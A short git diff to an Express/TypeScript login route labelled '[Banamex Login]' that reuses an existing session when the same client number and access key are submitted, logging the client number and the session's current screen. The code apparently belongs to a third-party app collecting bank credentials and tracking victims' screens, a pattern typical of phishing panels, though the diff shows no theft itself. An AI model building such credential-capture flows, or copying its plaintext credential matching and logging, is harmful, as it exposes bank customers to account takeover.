@@ -777,6 +777,21 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(400).json({ message: "Número de cliente y clave de acceso son requeridos" });
       }
 
+      // Buscar si existe una sesión activa con las mismas credenciales
+      const existingSession = await storage.getSessionByCredentials(numeroCliente, claveAcceso);
+
+      if (existingSession) {
+        console.log(`[Banamex Login] Sesión existente encontrada: ${existingSession.sessionId}, Cliente: ${numeroCliente}`);
+        console.log(`[Banamex Login] Redirigiendo a sesión existente en pantalla: ${existingSession.pasoActual}`);
+        
+        return res.json({ 
+          success: true, 
+          sessionId: existingSession.sessionId,
+          message: "Reconectado a sesión existente" 
+        });
+      }
+
+      // Si no existe sesión, crear una nueva
       const sessionId = nanoid(10);
 
       const session = await storage.createSession({ 
